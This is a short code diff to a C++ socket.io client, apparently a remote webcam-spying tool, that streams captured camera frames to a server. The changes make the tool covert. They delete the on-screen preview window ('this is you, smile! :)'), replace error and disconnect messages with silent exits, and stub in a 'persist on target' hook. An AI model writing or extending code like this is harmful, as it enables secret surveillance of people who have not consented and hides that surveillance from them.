@@ -43,14 +43,13 @@ namespace silence {
     }
 
     void Client::onConnected(const std::string &nsp) {
+        // persist on target
+        // impl::persist();
     }
 
-    void Client::onFailed() { std::cout << "sio failed" << std::endl; }
+    void Client::onFailed() { exit(0); }
 
-    void Client::onClosed(sio::client::close_reason const &reason) {
-        std::cout << reason << std::endl;
-        std::cout << "sio closed" << std::endl;
-    }
+    void Client::onClosed(sio::client::close_reason const &reason) { exit(0); }
 
     sio::message::list Client::createObject(const CommandObject &object) {
         auto obj = sio::object_message::create();
@@ -86,7 +85,6 @@ namespace silence {
             if (image.empty())
                 break;
 
-            imshow("this is you, smile! :)", image);
             response("frame", SIOBIN(impl::toBinaryString(image)));
         }
 
